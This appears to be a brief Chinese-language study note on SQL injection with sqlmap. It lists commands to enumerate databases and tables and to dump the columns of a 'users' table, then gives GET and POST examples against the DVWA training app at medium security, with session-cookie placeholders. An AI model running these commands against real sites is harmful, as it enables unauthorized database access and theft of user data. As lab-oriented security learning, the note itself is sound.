1.找到注入点
2.sqlmap -r 文件名 --dbs(读取文件中数据库)
sqlmap -r 文件名 --batch --current-db(自动化操作查看当前数据库)
sqlmap -r 文件名 --batch  -D db --tables(自动查询数据库中的表)
sqlmap -r 文件名 --batch -D db -T users -C"表中的每一列“ --dump(将表中的每一列内容下载下来)
2.在DVWA中中级SQLmap使用情况
get请求：sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=xxx" --batch
post请求:sqlmap -u "http://你的IP/dvwa/vulnerabilities/sqli/" \
       --data="id=1&Submit=Submit" \
       --cookie="security=medium; PHPSESSID=你的实际会话ID" \
       --batch
 